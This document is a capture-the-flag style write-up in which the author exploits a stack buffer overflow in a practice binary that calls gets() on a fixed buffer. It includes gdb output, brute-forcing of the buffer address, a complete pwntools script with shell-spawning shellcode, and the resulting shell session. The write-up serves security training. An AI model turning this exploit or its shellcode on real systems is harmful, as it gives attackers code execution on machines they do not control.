The exploit I have here will most lijeky not work if it is copy and pasted without reconfiguring it. Let's take a look at the source code...

```
#include <stdio.h>
#include <string.h>

void nothing()
{
	char* buf0[50];
	gets(buf0);
}

int main()
{
	printf("There, now you have less than nothing. Yet you still try. Some would recogmedn a psychologist. I recogmend natural selection\n");
	nothing();
}
```

So looking at this code, it looks pretty similar to the previous challenge. In fact it is pretty much just a copy and paste of the last challenge. However it is missing one thing that made our lives easy. It is no longer printing out the address of the buffer, so we will have to find that ourselves. Now there are a lot of different methods you could go about finding the address. However that address changes for things such as running at a different privilege level, and if it is in gdb. What we can do for this instance is we can look at the address in gdb. This won't be the exact address, however using that address as a base we should be able to brute force the actual address. Let me show you.

```
gdb-peda$ disas nothing
Dump of assembler code for function nothing:
   0x0804841b <+0>:	push   ebp
   0x0804841c <+1>:	mov    ebp,esp
   0x0804841e <+3>:	sub    esp,0xd8
   0x08048424 <+9>:	sub    esp,0xc
   0x08048427 <+12>:	lea    eax,[ebp-0xd0]
   0x0804842d <+18>:	push   eax
   0x0804842e <+19>:	call   0x80482e0 <gets@plt>
   0x08048433 <+24>:	add    esp,0x10
   0x08048436 <+27>:	nop
   0x08048437 <+28>:	leave  
   0x08048438 <+29>:	ret    
End of assembler dump.
gdb-peda$ b *nothing+24
Breakpoint 1 at 0x8048433
gdb-peda$ r
Starting program: /Hackery/escape/buf_ovf/b5/b5 
There, now you have less than nothing. Yet you still try. Some would recogmedn a psychologist. I recogmend natural selection
0000
```

One wall of text later...

```
Breakpoint 1, 0x08048433 in nothing ()
gdb-peda$ x/20x $ebp-0xd0
0xffffcf68:	0x30303030	0xf7e6a300	0xf7fb4d60	0x0804a008
0xffffcf78:	0x0000007d	0xf7e6c3ac	0x0804856b	0xf7fb4d60
0xffffcf88:	0x00000001	0xf7e6d2d4	0x0000007d	0x0000000a
0xffffcf98:	0xf7fb5870	0xf7e6c12d	0xf7fb4d60	0x0804a008
0xffffcfa8:	0xf7fb4d60	0xf7e6c47b	0xf7fb4d60	0x0804a008
```

So as you can see the address of the buffer is stored at 0xffffcf68. If we were to hardcode that address into our exploit the exploit will work, however only when we run it in gdb under the same settings. However if you notice something with all of the subsequent addresses, the are stored in 16 byte increments. If the address that we saw from gdb servers as a rough estimate, then we should be able to move up and down from 0xffffcf68 untill we find an address that works. Here is a list of the addresses I went through, before I found one that worked.

```
0xffffcf58
0xffffcf48
0xffffcf38
0xffffcf78
0xffffcf88
```

And then I found the address that worked for me, 0xffffcf88. Here is my exploit script with the address hard coded in (yes it is the same script from the last challenge with one line changed).

```
#Import the pwntools library.
from pwn import *

#The process is like an actualy command you run, so you will have to adjust the path if your exploit isn't in the same directory as the challenge.
target = process("./b5")

#Just receive the first line, which for our purposes isn't important.
target.recvline()

#Hardcode in the address of the buffer
address = "0xffffcf88"

#Convert the string to a hexidecimal
address = int(address, 16)

#Pack the hexidecimal in little endian for 32 bit systems
address = p32(address)

#Store the shellcode in a variable
shellcode = "\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80"

#Make the filler to reach the eip register
filler = "0"*178

#Craft the payload
payload = shellcode + filler + address

#Send the payload
target.sendline(payload)

#Drop into interactive mode so you can use the shell
target.interactive()
```

Let's try out the exploit.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b5$ python exploit.py 
[+] Starting local process './b5': Done
[*] Switching to interactive mode
$ echo Is this working?
Is this working?
$ ls
Readme.md  b5  b5.c  b5_secure    b5_secure.c  exploit.py  out
$ cat out
If you don't stop trying to leave, we can't have a celebration for you. Level Cleared!
$ exit
[*] Got EOF while reading in interactive
$ exit
[*] Process './b5' stopped with exit code 0
[*] Got EOF while sending in interactive
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b5$ 
```

And just like that we pwned the binary. Since this is so similar to the previous challenge, if you want to patch this please refer to the previous challenge.
